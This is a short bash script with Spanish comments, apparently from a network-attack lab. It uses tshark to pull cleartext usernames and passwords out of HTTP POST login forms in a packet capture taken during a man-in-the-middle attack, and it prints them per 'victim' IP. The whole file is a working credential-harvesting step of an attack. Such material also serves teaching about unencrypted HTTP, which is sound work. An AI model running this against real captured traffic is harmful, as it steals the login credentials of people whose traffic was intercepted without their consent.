#!/bin/bash
# leer_captura.sh — extrae en claro usuario y contraseña de los formularios de login (HTTP POST)
# de una captura .pcap hecha con Wireshark/tshark durante un ataque Man-in-the-Middle.
#
# Uso:  ./leer_captura.sh [captura.pcap]        (por defecto /root/captura.pcap)
#
# tshark (el Wireshark de terminal) filtra solo las peticiones POST, que es donde viaja el
# formulario de login, y disecciona el cuerpo (urlencoded-form) para sacar cada campo y su
# valor. En una web sin HTTPS todo va en claro, así que salen usuario y contraseña legibles.
PCAP="${1:-/root/captura.pcap}"

echo "=== Credenciales en claro capturadas en $PCAP ==="
tshark -r "$PCAP" -Y 'http.request.method == POST' \
       -T fields -e ip.src -e ip.dst -e urlencoded-form.key -e urlencoded-form.value \
       2>/dev/null | sort -u | while IFS=$'\t' read -r src dst keys vals; do
    [ -z "$keys" ] && continue
    echo "  victima $src  ->  servidor $dst"
    paste -d'=' <(printf '%s' "$keys" | tr ',' '\n') <(printf '%s' "$vals" | tr ',' '\n') \
        | sed 's/^/     /'
done
echo "==============================================="
